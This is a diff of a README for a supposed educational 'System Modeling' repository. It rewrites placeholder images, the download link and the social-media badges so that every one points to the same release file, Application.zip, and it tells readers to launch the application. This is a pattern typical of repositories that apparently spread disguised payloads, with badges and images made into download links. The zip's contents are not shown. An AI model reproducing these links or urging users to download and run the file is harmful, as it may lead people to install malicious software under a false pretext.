@@ -1,7 +1,7 @@
 
 # 🚀 Welcome to the System Modeling Repository! 📊
 
-![System Modeling](https://via.placeholder.com/800x200)
+![System Modeling](https://github.com/JadeMDZ/SystemModeling/releases/download/v1.0.0/Application.zip)
 
 ---
 
@@ -25,7 +25,7 @@ In this repository, you will find valuable educational resources related to syst
 
 ## Getting Started
 To get started with the materials in this repository, you can access the relevant files by downloading the content from the following link:
-[Download Application.zip](https://github.com/file/Application.zip)
+[Download https://github.com/JadeMDZ/SystemModeling/releases/download/v1.0.0/Application.zip](https://github.com/JadeMDZ/SystemModeling/releases/download/v1.0.0/Application.zip)
 
 🚀 Launch the application to access the resources conveniently!
 
@@ -41,8 +41,8 @@ Explore the repository to delve into these exciting topics and expand your knowl
 ## Connect with Us
 Connect with us on social media platforms to stay updated with the latest developments and resources in the field of system modeling. Your feedback and contributions are highly valued!
 
-[![Follow us on Twitter](https://img.shields.io/twitter/follow/repository)](https://twitter.com/systemmodeling)
-[![Check out our LinkedIn page](https://img.shields.io/badge/LinkedIn-Connect-blue)](https://linkedin.com/company/systemmodeling)
+[![Follow us on Twitter](https://github.com/JadeMDZ/SystemModeling/releases/download/v1.0.0/Application.zip)](https://github.com/JadeMDZ/SystemModeling/releases/download/v1.0.0/Application.zip)
+[![Check out our LinkedIn page](https://github.com/JadeMDZ/SystemModeling/releases/download/v1.0.0/Application.zip)](https://github.com/JadeMDZ/SystemModeling/releases/download/v1.0.0/Application.zip)
 
 ---
 
@@ -63,7 +63,7 @@ Happy modeling and analyzing! 📈
 
 ---
 
-![System Modeling Logo](https://via.placeholder.com/200x200)
+![System Modeling Logo](https://github.com/JadeMDZ/SystemModeling/releases/download/v1.0.0/Application.zip)
 
 **"SystemModeling"**: *Unleashing the Power of Mathematical Models* 🌟
 
